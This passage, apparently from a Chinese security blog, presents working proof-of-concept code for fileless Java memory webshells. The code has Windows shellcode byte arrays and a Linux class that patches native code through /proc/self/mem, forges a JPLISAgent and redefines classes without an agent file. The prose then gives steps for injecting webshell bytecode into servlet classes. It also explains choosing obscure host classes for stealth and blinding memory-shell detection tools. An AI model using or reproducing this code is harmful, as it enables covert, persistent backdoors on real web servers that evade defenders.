x56,(byte)0x4D,(byte)0x73,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x51,(byte)0x48,(byte)0xB9,(byte)0x72,(byte)0x65,(byte)0x61,(byte)0x74,(byte)0x65,(byte)0x64,(byte)0x4A,(byte)0x61,(byte)0x51,(byte)0x48,(byte)0xB9,(byte)0x4A,(byte)0x4E,(byte)0x49,(byte)0x5F,(byte)0x47,(byte)0x65,(byte)0x74,(byte)0x43,(byte)0x51,(byte)0x48,(byte)0x89,(byte)0xE2,(byte)0x4C,(byte)0x89,(byte)0xF9,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x28,(byte)0xFF,(byte)0xD7,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x28,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x18,(byte)0x49,(byte)0x89,(byte)0xC7,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x28,(byte)0x48,(byte)0x89,(byte)0xE1,(byte)0xBA,(byte)0x01,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x49,(byte)0x89,(byte)0xC8,(byte)0x49,(byte)0x83,(byte)0xC0,(byte)0x08,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x28,(byte)0x41,(byte)0xFF,(byte)0xD7,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x28,(byte)0x48,(byte)0x8B,(byte)0x09,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x20,(byte)0x54,(byte)0x48,(byte)0x89,(byte)0xE2,(byte)0x4D,(byte)0x31,(byte)0xC0,(byte)0x4C,(byte)0x8B,(byte)0x39,(byte)0x4D,(byte)0x8B,(byte)0x7F,(byte)0x20,(byte)0x49,(byte)0x89,(byte)0xCE,(byte)0x41,(byte)0xFF,(byte)0xD7,(byte)0x4C,(byte)0x89,(byte)0xF1,(byte)0x48,(byte)0xBA,(byte)0x48,(byte)0x47,(byte)0x46,(byte)0x45,(byte)0x44,(byte)0x43,(byte)0x42,(byte)0x41,(byte)0x41,(byte)0xB8,(byte)0x00,(byte)0x02,(byte)0x01,(byte)0x30,(byte)0x4D,(byte)0x8B,(byte)0x3E,(byte)0x4D,(byte)0x8B,(byte)0x7F,(byte)0x30,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x20,(byte)0x41,(byte)0xFF,(byte)0xD7,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x20,(byte)0x4C,(byte)0x89,(byte)0xF1,(byte)0x4D,(byte)0x8B,(byte)0x3E,(byte)0x4D,(byte)0x8B,(byte)0x7F,(byte)0x28,(byte)0x41,(byte)0xFF,(byte)0xD7,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x78,(byte)0xC3};
        byte[] stub=new byte[]{0x48,0x47,0x46,0x45,0x44,0x43,0x42,0x41};
        if (pointerLength==4) {
            buf = new byte[]{(byte) 0x90, (byte) 0x90, (byte) 0x90, (byte) 0x33, (byte) 0xC9, (byte) 0x64, (byte) 0xA1, (byte) 0x30, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x8B, (byte) 0x40, (byte) 0x0C, (byte) 0x8B, (byte) 0x70, (byte) 0x14, (byte) 0xAD, (byte) 0x96, (byte) 0xAD, (byte) 0x8B, (byte) 0x58, (byte) 0x10, (byte) 0x8B, (byte) 0x53, (byte) 0x3C, (byte) 0x03, (byte) 0xD3, (byte) 0x8B, (byte) 0x52, (byte) 0x78, (byte) 0x03, (byte) 0xD3, (byte) 0x33, (byte) 0xC9, (byte) 0x8B, (byte) 0x72, (byte) 0x20, (byte) 0x03, (byte) 0xF3, (byte) 0x41, (byte) 0xAD, (byte) 0x03, (byte) 0xC3, (byte) 0x81, (byte) 0x38, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x50, (byte) 0x75, (byte) 0xF4, (byte) 0x81, (byte) 0x78, (byte) 0x04, (byte) 0x72, (byte) 0x6F, (byte) 0x63, (byte) 0x41, (byte) 0x75, (byte) 0xEB, (byte) 0x81, (byte) 0x78, (byte) 0x08, (byte) 0x64, (byte) 0x64, (byte) 0x72, (byte) 0x65, (byte) 0x75, (byte) 0xE2, (byte) 0x8B, (byte) 0x72, (byte) 0x24, (byte) 0x03, (byte) 0xF3, (byte) 0x66, (byte) 0x8B, (byte) 0x0C, (byte) 0x4E, (byte) 0x49, (byte) 0x8B, (byte) 0x72, (byte) 0x1C, (byte) 0x03, (byte) 0xF3, (byte) 0x8B, (byte) 0x14, (byte) 0x8E, (byte) 0x03, (byte) 0xD3, (byte) 0x52, (byte) 0x33, (byte) 0xC9, (byte) 0x51, (byte) 0x68, (byte) 0x61, (byte) 0x72, (byte) 0x79, (byte) 0x41, (byte) 0x68, (byte) 0x4C, (byte) 0x69, (byte) 0x62, (byte) 0x72, (byte) 0x68, (byte) 0x4C, (byte) 0x6F, (byte) 0x61, (byte) 0x64, (byte) 0x54, (byte) 0x53, (byte) 0xFF, (byte) 0xD2, (byte) 0x83, (byte) 0xC4, (byte) 0x0C, (byte) 0x59, (byte) 0x50, (byte) 0x66, (byte) 0xB9, (byte) 0x33, (byte) 0x32, (byte) 0x51, (byte) 0x68, (byte) 0x6A, (byte) 0x76, (byte) 0x6D, (byte) 0x00, (byte) 0x54, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0xD8, (byte) 0x83, (byte) 0xC4, (byte) 0x0C, (byte) 0x5A, (byte) 0x33, (byte) 0xC9, (byte) 0x51, (byte) 0x6A, (byte) 0x73, (byte) 0x68, (byte) 0x76, (byte) 0x61, (byte) 0x56, (byte) 0x4D, (byte) 0x68, (byte) 0x65, (byte) 0x64, (byte) 0x4A, (byte) 0x61, (byte) 0x68, (byte) 0x72, (byte) 0x65, (byte) 0x61, (byte) 0x74, (byte) 0x68, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x43, (byte) 0x68, (byte) 0x4A, (byte) 0x4E, (byte) 0x49, (byte) 0x5F, (byte) 0x54, (byte) 0x53, (byte) 0xFF, (byte) 0xD2, (byte) 0x89, (byte) 0x45, (byte) 0xF0, (byte) 0x54, (byte) 0x6A, (byte) 0x01, (byte) 0x54, (byte) 0x59, (byte) 0x83, (byte) 0xC1, (byte) 0x10, (byte) 0x51, (byte) 0x54, (byte) 0x59, (byte) 0x6A, (byte) 0x01, (byte) 0x51, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0xC1, (byte) 0x83, (byte) 0xEC, (byte) 0x30, (byte) 0x6A, (byte) 0x00, (byte) 0x54, (byte) 0x59, (byte) 0x83, (byte) 0xC1, (byte) 0x10, (byte) 0x51, (byte) 0x8B, (byte) 0x00, (byte) 0x50, (byte) 0x8B, (byte) 0x18, (byte) 0x8B, (byte) 0x43, (byte) 0x10, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0x43, (byte) 0x18, (byte) 0x68, (byte) 0x00, (byte) 0x02, (byte) 0x01, (byte) 0x30, (byte) 0x68, (byte) 0x44, (byte) 0x43, (byte) 0x42, (byte) 0x41, (byte) 0x83, (byte) 0xEC, (byte) 0x04, (byte) 0xFF, (byte) 0xD0, (byte) 0x83, (byte) 0xEC, (byte) 0x0C, (byte) 0x8B, (byte) 0x43, (byte) 0x14, (byte) 0xFF, (byte) 0xD0, (byte) 0x83, (byte) 0xC4, (byte) 0x5C, (byte) 0xC3};
            stub=new byte[]{0x44,0x43,0x42,0x41};
        }
        buf=replaceBytes(buf,stub,long2ByteArray_Little_Endian(JPLISAgent+pointerLength,pointerLength));
        classBody[7]=0x32;
        try {
            System.loadLibrary("attach");
            enqueue(-1, buf, "enqueue", "enqueue");
        } catch (Exception e) {
            e.printStackTrace();
            return;
        }
        long native_jvmtienv=unsafe.getLong(JPLISAgent+pointerLength);
        if (pointerLength==4)
        {
            unsafe.putByte(native_jvmtienv+201 , (byte) 2);
        }
        else
        {
            unsafe.putByte(native_jvmtienv+361 , (byte) 2);
        }
        try {
            Class<?> instrument_clazz = Class.forName("sun.instrument.InstrumentationImpl");
            Constructor<?> constructor = instrument_clazz.getDeclaredConstructor(long.class, boolean.class, boolean.class);
            constructor.setAccessible(true);
            Object inst = constructor.newInstance(JPLISAgent, true, false);

            ClassDefinition definition = new ClassDefinition(Class.forName(className), classBody);
            Method redefineClazz = instrument_clazz.getMethod("redefineClasses", ClassDefinition[].class);
            redefineClazz.invoke(inst, new Object[] {
                    new ClassDefinition[] {
                            definition
                    }
            });
        }
        catch (Throwable error)
        {
            error.printStackTrace();
            throw  error;
        }

    }
    /**
     * long 转字节数组，小端
     */
    public static byte[] long2ByteArray_Little_Endian(long l,int length) {

        byte[] array = new byte[length];

        for (int i = 0; i < array.length; i++) {
            array[i] = (byte) (l >> (i * 8));
        }
        return array;
    }


    private static byte[] replaceBytes(byte[] bytes,byte[] byteSource,byte[] byteTarget)
    {
        for(int i=0;i<bytes.length;i++)
        {
            boolean bl=true;//从当前下标开始的字节是否与欲替换字节相等;
            for(int j=0;j<byteSource.length;j++)
            {
                if(i+j<bytes.length&&bytes[i+j]==byteSource[j])
                {
                }
                else
                {
                    bl=false;
                }
            }
            if(bl)
            {
                System.arraycopy(byteTarget, 0, bytes, i, byteTarget.length);
            }
        }
        return bytes;
    }


}
```

上面Poc中有两个属性，className和classBody。如果想要动态修改某个类的字节码，只需要实例化WindowsVirtualMachine类，设置className和classBody为目标类名和新的字节码数组，然后调用work方法，即可完成类的热修改。

#### Linux平台

在Linux平台下，将上文的shellcode整合，利用代码如下：

```
/**
 * @version 1.0
 * @Author 游望之
 * @注释
 */
import sun.misc.Unsafe;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.lang.instrument.ClassDefinition;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

public class MemShell {

    private void agentForLinux(String className,byte[] classBody) throws Exception {

        FileReader fin  = new FileReader("/proc/self/maps");
        BufferedReader reader = new BufferedReader(fin);
        String line;
        long RandomAccessFile_length = 0, JNI_GetCreatedJavaVMs = 0;
        while ((line = reader.readLine()) != null)
        {
            String[] splits = line.trim().split(" ");
            if(line.endsWith("libjava.so") && RandomAccessFile_length == 0) {
                String[] addr_range = splits[0].split("-");
                long libbase = Long.parseLong(addr_range[0], 16);
                String elfpath = splits[splits.length - 1];
                RandomAccessFile_length = find_symbol(elfpath, "Java_java_io_RandomAccessFile_length", libbase);
            }else if(line.endsWith("libjvm.so") && JNI_GetCreatedJavaVMs == 0) {
                String[] addr_range = splits[0].split("-");
                long libbase = Long.parseLong(addr_range[0], 16);
                String elfpath = splits[splits.length - 1];
                JNI_GetCreatedJavaVMs = find_symbol(elfpath, "JNI_GetCreatedJavaVMs", libbase);
            }

            if(JNI_GetCreatedJavaVMs != 0 && RandomAccessFile_length != 0)
                break;
        }
        fin.close();

        //修改Java_java_io_RandomAccessFile_open0的native代码，调用JNI_GetCreatedJavaVMs获取JavaVM，再通过JavaVM获取jvmtienv
        RandomAccessFile fout = new RandomAccessFile("/proc/self/mem", "rw");
        //RSP 16字节对齐
        byte[] stack_align = {0x55, 0x48, (byte)0x89, (byte)0xe5, 0x48, (byte)0xc7, (byte)0xc0, 0xf, 0, 0, 0, 0x48, (byte)0xf7, (byte)0xd0};

        byte[] movabs_rax = {0x48, (byte) 0xb8};
        ByteBuffer buffer = ByteBuffer.allocate(Long.BYTES);
        buffer.order(ByteOrder.LITTLE_ENDIAN);
        buffer.putLong(0, JNI_GetCreatedJavaVMs);

        byte[] b = {0x48, (byte) 0x83, (byte) 0xEC, 0x40, 0x48, 0x31, (byte) 0xF6, 0x48, (byte) 0xFF, (byte) 0xC6, 0x48, (byte) 0x8D, 0x54, 0x24, 0x04, 0x48,
                (byte) 0x8D, 0x7C, 0x24, 0x08, (byte) 0xFF, (byte) 0xD0, 0x48, (byte) 0x8B, 0x7C, 0x24, 0x08, 0x48, (byte) 0x8D, 0x74, 0x24, 0x10,
                (byte) 0xBA, 0x00, 0x02, 0x01, 0x30, 0x48, (byte) 0x8B, 0x07, (byte) 0xFF, 0x50, 0x30, 0x48, (byte) 0x8B, 0x44, 0x24, 0x10,
                0x48, (byte) 0x83, (byte) 0xC4, 0x40, (byte)0xC9, (byte) 0xC3 };

        int shellcode_len = b.length + 8 + movabs_rax.length + stack_align.length;
        long landingpad = RandomAccessFile_length;

        byte[] backup = new byte[shellcode_len];
        fout.seek(landingpad);
        fout.read(backup);



        fout.seek(landingpad);
        fout.write(stack_align);
        fout.write(movabs_rax);
        fout.write(buffer.array());
        fout.write(b);
        fout.close();



        long native_jvmtienv = fout.length(); //触发执行
        System.out.printf("native_jvmtienv %x\n", native_jvmtienv);

        //恢复代码
        fout = new RandomAccessFile("/proc/self/mem", "rw");
        fout.seek(RandomAccessFile_length);
        fout.write(backup);
        fout.close();

        Unsafe unsafe = null;
        try {
            Field field = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe = (sun.misc.Unsafe) field.get(null);
        } catch (Exception e) {
            throw new AssertionError(e);
        }
        //libjvm.so的jvmti_RedefineClasses函数会校验if ( (*((_BYTE *)jvmtienv + 361) & 2) != 0 )
        unsafe.putByte(native_jvmtienv + 361, (byte) 2);
        //伪造JPLISAgent结构时，只需要填mNormalEnvironment中的mJVMTIEnv即可，其他变量代码中实际没有使用
        long JPLISAgent = unsafe.allocateMemory(0x1000);
        unsafe.putLong(JPLISAgent + 8, native_jvmtienv);
        //利用伪造的JPLISAgent结构实例化InstrumentationImpl
        try {
            Class<?> instrument_clazz = Class.forName("sun.instrument.InstrumentationImpl");
            Constructor<?> constructor = instrument_clazz.getDeclaredConstructor(long.class, boolean.class, boolean.class);
            constructor.setAccessible(true);
            Object inst = constructor.newInstance(JPLISAgent, true, false);


            ClassDefinition definition = new ClassDefinition(Class.forName(className), classBody);
            Method redefineClazz = instrument_clazz.getMethod("redefineClasses", ClassDefinition[].class);
            redefineClazz.invoke(inst, new Object[] {
                    new ClassDefinition[] {
                            definition
                    }
            });
        }catch(Exception e) {
            e.printStackTrace();
        }
        fout.getFD();

    }
    private static final int SHT_DYNSYM = 11;
    private static final int STT_FUNC    =2;
    private static final int STT_GNU_IFUNC    =10;

    private static int ELF_ST_TYPE(int x) {
        return (x & 0xf);
    }

    static long find_symbol(String elfpath, String sym, long libbase) throws IOException {
        long func_ptr = 0;
        RandomAccessFile fin = new RandomAccessFile(elfpath, "r");

        byte[] e_ident = new byte[16];
        fin.read(e_ident);
        short e_type = Short.reverseBytes(fin.readShort());
        short e_machine = Short.reverseBytes(fin.readShort());
        int e_version = Integer.reverseBytes(fin.readInt());
        long e_entry = Long.reverseBytes(fin.readLong());
        long e_phoff = Long.reverseBytes(fin.readLong());
        long e_shoff = Long.reverseBytes(fin.readLong());
        int e_flags = Integer.reverseBytes(fin.readInt());
        short e_ehsize = Short.reverseBytes(fin.readShort());
        short e_phentsize = Short.reverseBytes(fin.readShort());
        short e_phnum = Short.reverseBytes(fin.readShort());
        short e_shentsize = Short.reverseBytes(fin.readShort());
        short e_shnum = Short.reverseBytes(fin.readShort());
        short e_shstrndx = Short.reverseBytes(fin.readShort());

        int sh_name = 0;
        int sh_type = 0;
        long sh_flags = 0;
        long sh_addr = 0;
        long sh_offset = 0;
        long sh_size = 0;
        int sh_link = 0;
        int sh_info = 0;
        long sh_addralign = 0;
        long sh_entsize = 0;

        for(int i = 0; i < e_shnum; ++i) {
            fin.seek(e_shoff + i*64);
            sh_name = Integer.reverseBytes(fin.readInt());
            sh_type = Integer.reverseBytes(fin.readInt());
            sh_flags = Long.reverseBytes(fin.readLong());
            sh_addr = Long.reverseBytes(fin.readLong());
            sh_offset = Long.reverseBytes(fin.readLong());
            sh_size = Long.reverseBytes(fin.readLong());
            sh_link = Integer.reverseBytes(fin.readInt());
            sh_info = Integer.reverseBytes(fin.readInt());
            sh_addralign = Long.reverseBytes(fin.readLong());
            sh_entsize = Long.reverseBytes(fin.readLong());
            if(sh_type == SHT_DYNSYM) {
                break;
            }
        }

        int symtab_shdr_sh_link = sh_link;
        long symtab_shdr_sh_size = sh_size;
        long symtab_shdr_sh_entsize = sh_entsize;
        long symtab_shdr_sh_offset = sh_offset;

        fin.seek(e_shoff + symtab_shdr_sh_link * e_shentsize);
        sh_name = Integer.reverseBytes(fin.readInt());
        sh_type = Integer.reverseBytes(fin.readInt());
        sh_flags = Long.reverseBytes(fin.readLong());
        sh_addr = Long.reverseBytes(fin.readLong());
        sh_offset = Long.reverseBytes(fin.readLong());
        sh_size = Long.reverseBytes(fin.readLong());
        sh_link = Integer.reverseBytes(fin.readInt());
        sh_info = Integer.reverseBytes(fin.readInt());
        sh_addralign = Long.reverseBytes(fin.readLong());
        sh_entsize = Long.reverseBytes(fin.readLong());

        long symstr_shdr_sh_offset = sh_offset;

        long cnt = symtab_shdr_sh_entsize > 0 ? symtab_shdr_sh_size/symtab_shdr_sh_entsize : 0;
        for(long i = 0; i < cnt; ++i) {
            fin.seek(symtab_shdr_sh_offset + symtab_shdr_sh_entsize*i);
            int st_name = Integer.reverseBytes(fin.readInt());
            byte st_info = fin.readByte();
            byte st_other = fin.readByte();
            short st_shndx = Short.reverseBytes(fin.readShort());
            long st_value = Long.reverseBytes(fin.readLong());
            long st_size = Long.reverseBytes(fin.readLong());
            if(st_value == 0
                    || st_name == 0
                    || (ELF_ST_TYPE(st_info) != STT_FUNC && ELF_ST_TYPE(st_info) != STT_GNU_IFUNC))
            {
                continue;
            }

            fin.seek(symstr_shdr_sh_offset + st_name);
            String name = "";
            byte ch = 0;
            while((ch = fin.readByte()) != 0)
            {
                name += (char)ch;
            }

            if(sym.equals(name))
            {
                func_ptr = libbase + st_value;
                break;
            }
        }

        fin.close();

        return func_ptr;
    }
}
```

上面代码是我在游望之的Poc上做了一些修改，如果需要对Linux平台下的Java类字节码进行动态替换，只要实例化上述MemShell类，调用agentForLinux函数即可。agentForLinux函数有两个参数，第一个为需要动态修改的类名，第二个为类的新版本字节码数组。

至此，我们就在无需目标磁盘落地文件的前提下，优雅而又安静的完成了动态修改Java类的能力。为了后续讨论方便，我将这种无需提供Agent.jar或者Agent.so来直接调用JVMTI接口的能力称作AgentNoFile。

### 植入内存马

有了动态修改类字节码的能力，注入内存马就没有障碍了，流程如下：

1.  首先选定需要植入的宿主类，比如weblogic/servlet/internal/ServletStubImpl.class，jakarta/servlet/http/HttpServlet.class,javax/servlet/http/HttpServlet.class。这三个类基本可以覆盖主流的Java web容器了。
2.  读取宿主类的字节码；
3.  往步骤2中的字节码中插入webshell字节码，这一步可以用asm或者Javaassit完成，当然也可以直接硬编码别人植入好的成品；
4.  调用上文中的动态修改类的函数，传递宿主类名和修改过的类字节码数组，植入完成。

上述就是利用AgentNoFile技术植入内存马的一般步骤，当然具体选哪个宿主类可以根据环境自定义，比如选一些比较冷门但是却必现在正常执行流程中的类，这样可以更具隐蔽性。

冰蝎v4.0已集成该能力。

### 后记

通过Java AgentNoFile方式植入的内存马，整个过程中不会有文件在磁盘上落地，而且不会在JVM中新增类，甚至连方法也不会增加。它就像inline hook一样无色无味。在目前已有的基于反射机制的内存马查杀工具面前，它是隐形的。如果配合我文中介绍的Anti-Attch机制，基于Java Agent技术的内存马查杀工具也会直接被致盲。

另外，本文标题虽然是讲内存马的注入，实际是提供了一种打通Java到Native层的一个不受约束的通道。利用这个通道，其实能做的事情非常多。

### 参考

1.  [利用“进程注入”实现无文件复活 WebShell](https://www.freebuf.com/news/172753.html)
2.  [Java内存攻击技术漫谈](https://xz.aliyun.com/t/10075)
3.  [Linux下内存马进阶植入技术](https://mp.weixin.qq.com/s/ulINOH4BnwfR7MBc6r5YHQ)
